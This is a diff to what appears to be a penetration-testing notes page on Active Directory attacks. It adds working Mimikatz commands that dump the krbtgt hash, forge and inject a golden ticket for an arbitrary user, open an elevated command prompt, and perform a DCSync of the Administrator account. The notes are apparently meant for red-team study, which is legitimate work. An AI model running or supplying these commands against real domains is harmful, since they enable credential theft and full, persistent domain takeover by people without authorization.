@@ -47,6 +47,30 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
 
-Provide values for: `kerberos::golden /user: /domain: /sid: /krbtgt: /id`,
-like: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-SID /krbtgt:HASH /id:ID`,then  open command prompt with elevated privileges `misc::cmd`.
+With Domain Admin group access:
+```powershell
+privilege::debug
+lsadump::lsa /patch
+# Look for krbtgt
+```
 
+Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain. 
+Provide values for: `kerberos::golden /user: /domain: /sid: /krbtgt: /id`,
+like: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-SID /krbtgt:HASH /id:ID`, then open command prompt with elevated privileges `misc::cmd`.
+
+```powershell 
+kerberos::purge # Removed cached tickets
+kerberos::golden /user:hacker /domain:$domainname.com /sid:$sid /krbtgt:$krbtgt-hash /ptt 
+misc::cmd
+```
+
+Mimikatz provides two sets of default values when using the golden ticket option:
+1. User IP - default set: 500, RID of builtin Administrator
+2. Group IP - Domain Admins group
+
+### DCSync Attacks
+Visit [[Active-Directory-Persistence]] for details.
+
+```powershell
+lsadump::dcsync /user:Administrator
+```
